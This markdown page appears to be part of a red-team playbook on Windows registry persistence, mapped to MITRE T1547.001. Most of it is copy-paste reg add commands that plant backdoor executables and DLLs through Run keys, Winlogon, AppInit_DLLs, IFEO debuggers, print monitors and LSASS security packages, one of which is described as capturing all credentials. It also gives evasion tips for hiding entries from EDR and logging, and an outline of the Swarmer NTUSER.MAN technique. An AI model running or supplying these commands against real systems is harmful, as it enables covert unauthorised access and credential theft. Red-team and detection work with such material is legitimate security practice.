# Registry-Based Persistence

> **MITRE ATT&CK**: Persistence > T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
> **Platforms**: Windows
> **Required Privileges**: User (HKCU keys), Admin (HKLM keys)
> **OPSEC Risk**: Medium (Run keys are well-known but many legitimate entries exist)

---

## Strategic Overview

The Windows Registry is the most traditional persistence mechanism, offering dozens of locations where executables or commands can be configured to run automatically at boot, logon, or specific system events. As a Red Team Lead, you must recognize that Run/RunOnce keys are the first place any forensic analyst or EDR tool checks. However, the Windows Registry contains hundreds of autostart extensibility points (ASEPs), many of which are obscure and rarely monitored. The strategy is to use lesser-known registry locations, blend with legitimate entries by mimicking naming conventions, and understand which registry keys are monitored by the specific EDR deployed in the target environment. Registry persistence is fast to deploy and easy to clean up, making it suitable for operations where rapid establishment and removal of persistence are priorities.

## Technical Deep-Dive

### Run / RunOnce Keys (Most Common)

```bash
# User-level persistence (no admin required)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\updater.exe" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "ConfigSetup" /t REG_SZ /d "C:\temp\payload.exe" /f

# Machine-level persistence (requires admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /t REG_SZ /d "C:\ProgramData\health.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SetupComplete" /t REG_SZ /d "C:\temp\payload.exe" /f

# Additional Run key locations (64-bit/32-bit)
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" /v "SysCheck" /t REG_SZ /d "C:\payload.exe" /f
```

### Winlogon Keys

Winlogon processes execute at user logon before the desktop loads.

```bash
# Shell - replaces or appends to the default shell (explorer.exe)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\ProgramData\backdoor.exe" /f

# Userinit - executes after user authentication
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\ProgramData\backdoor.exe" /f

# Notify (legacy, pre-Vista) - DLL loaded by Winlogon
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\SecurityUpdate" /v "DLLName" /t REG_SZ /d "C:\Windows\System32\evil.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\SecurityUpdate" /v "Startup" /t REG_SZ /d "EntryPoint" /f
```

### AppInit_DLLs

DLLs loaded into every process that loads User32.dll (most GUI applications).

```bash
# Requires admin, and SecureBoot/UEFI may block this
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\ProgramData\payload.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f

# 32-bit applications on 64-bit systems
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\ProgramData\payload32.dll" /f
```

### Image File Execution Options (IFEO) Debugger

Redirect legitimate binary execution to attacker-controlled binary.

```bash
# When notepad.exe is launched, cmd.exe runs instead
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f

# Stealthier: target a binary that runs at logon
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\ProgramData\backdoor.exe" /f

# GlobalFlag + SilentProcessExit - execute when target process exits
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "GlobalFlag" /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v "MonitorProcess" /t REG_SZ /d "C:\ProgramData\backdoor.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v "ReportingMode" /t REG_DWORD /d 1 /f
```

### Explorer Shell Extensions and Load Key

```bash
# Load key - runs at user logon (user-level, no admin)
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "Load" /t REG_SZ /d "C:\Users\Public\updater.exe" /f

# Shell service object delay load
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad" /v "UpdateCheck" /t REG_SZ /d "{CLSID-of-malicious-COM-object}" /f
```

### Print Monitors

DLLs loaded by the Print Spooler service (runs as SYSTEM).

```bash
# Register a malicious print monitor DLL (runs as SYSTEM)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\EvilMonitor" /v "Driver" /t REG_SZ /d "evil_monitor.dll" /f
# DLL must be placed in C:\Windows\System32\
copy evil_monitor.dll C:\Windows\System32\
# Restart spooler to trigger
net stop spooler && net start spooler
```

### Security Packages and Authentication Packages

DLLs loaded by LSASS at boot -- extremely powerful persistence.

```bash
# Security Support Provider (SSP) - loaded into LSASS
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0evilssp" /f
# DLL (evilssp.dll) must be in System32. Captures all authentication credentials.

# Authentication Package - loaded at boot by LSASS
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0evilauth" /f
```

### Natural Language Development Platform

Lesser-known registry key that loads DLLs at user logon.

```bash
reg add "HKCU\SOFTWARE\Microsoft\CTF\LangBarAddin\{GUID}" /v "FilePath" /t REG_SZ /d "C:\Users\Public\payload.dll" /f
reg add "HKCU\SOFTWARE\Microsoft\CTF\LangBarAddin\{GUID}" /v "Enable" /t REG_DWORD /d 1 /f
```

## Detection & Evasion

### Detection Mechanisms
- **Autoruns (Sysinternals)**: Enumerates all known ASEPs including registry locations
- **Sysmon Event IDs 12-14**: Registry key/value creation, modification, deletion
- **EDR registry monitoring**: Real-time alerting on known persistence registry paths
- **Event ID 4657**: Registry value modification auditing (if enabled)

### Evasion Techniques
- Use obscure registry locations (Natural Language, Print Monitors, SilentProcessExit)
- Name entries to match legitimate software (e.g., "AdobeUpdater", "GoogleChrome")
- Use REG_EXPAND_SZ with environment variable expansion for path obfuscation
- Store the payload path using short (8.3) filenames
- Modify registry via WMI or .NET to avoid reg.exe command-line logging
- Use registry symbolic links to redirect monitoring away from actual keys

### OPSEC Considerations
- Run/RunOnce keys are the first thing defenders check -- use only when stealth is not critical
- HKLM modifications require admin and trigger more monitoring than HKCU
- Winlogon and LSASS-related keys are extremely high-value targets for defenders
- Always plan for cleanup: document exact keys and values added during the operation

---

## 2025 Techniques

### Swarmer -- NTUSER.MAN Registry Hive Replacement (Zero API, Zero ETW)

The most significant new persistence technique of 2025 (Praetorian, published January 2026).
Exploits Windows `NTUSER.MAN` mandatory profile hive precedence. At logon, `NTUSER.MAN` takes
precedence over `NTUSER.DAT`. Produces **zero** Reg* API calls, ETW registry events, and
ProcMon traces. Works without admin privileges.

```
# How Swarmer works:
# 1. Export target user's HKCU hive
# 2. Modify it OFFLINE using Offline Registry Library (Offreg.dll)
#    - Adds Run key entries, or any registry-based persistence
#    - No standard Reg* API calls -> zero ETW registry telemetry
# 3. Convert to binary hive format
# 4. Drop as NTUSER.MAN in user's profile directory (C:\Users\<user>\)
# 5. At next logon, NTUSER.MAN takes precedence over NTUSER.DAT
# 6. Persistence entries activate silently

# Key advantages:
# - Zero Reg* API calls (bypasses all registry monitoring)
# - Zero ETW events
# - Zero ProcMon traces
# - No admin required (user can write to own profile directory)
# - Works on Windows 10 and 11

# github.com/praetorian-inc/swarmer
```

### CertPropSvc Registry Hijack

Persistence via hijacking the Certificate Propagation Service (`CertPropSvc`) registry keys.
A less-monitored service that can be abused for code execution at boot (cocomelonc, Sept 2025).

---

## Cross-References

- [COM Hijacking](com-hijacking.md) -- COM-based registry persistence
- [Services Persistence](services-persistence.md) -- Service-based registry persistence
- **ETW Evasion** (06-defense-evasion/etw-evasion.md) -- Swarmer achieves zero ETW registry telemetry
- **AV/EDR Evasion** (06-defense-evasion/av-edr-evasion.md) -- Evasion techniques for persistence payloads

## References

- Microsoft Autoruns: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns
- MITRE T1547.001: https://attack.mitre.org/techniques/T1547/001/
- Windows Registry Persistence (Hexacorn): https://www.hexacorn.com/blog/category/autostart-persistence/
- IFEO Persistence: https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/
- Praetorian Swarmer: https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/
- CertPropSvc Hijack: https://cocomelonc.github.io/persistence/2025/09/14/malware-pers-28.html
